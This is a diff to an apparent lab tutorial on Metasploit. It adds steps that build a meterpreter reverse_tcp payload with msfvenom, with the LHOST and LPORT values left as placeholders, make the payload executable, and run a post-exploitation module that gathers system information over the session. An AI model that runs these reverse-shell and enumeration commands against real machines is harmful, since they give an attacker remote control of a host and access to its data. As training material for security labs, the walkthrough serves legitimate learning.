@@ -28,10 +28,16 @@ set ExitOnSession false
 exploit -j
 ```
 
-2) In window (2), use msfvenom to download the meterpreter payload as a binary
+2) In window (2), use msfvenom to download a meterpreter payload as a binary.
+This payload (when configured properly), will connect with the open connection
+in step 1.
+
+> Substitute `XXXX` with correct calues
 
 ```
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.17.0.4 LPORT=8888 -f elf X > payload.elf
+cd /u4
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.17.0.XXX LPORT=XXXX -f elf X > payload.elf
+chmod 775 payload.elf
 ```
 
 3) In window (2), run the downloaded binary to establish a connection with metasploit
@@ -54,4 +60,12 @@ Active sessions
 ```
 
 5) Continue along your merry way by, for example, attempting to exploit a local
-binary
+binary.  As an easy example, you can now "gather" information from your local
+machine:
+
+```
+use post/linux/gather/enum_system
+sessions -l
+set SESSION 3
+run
+```
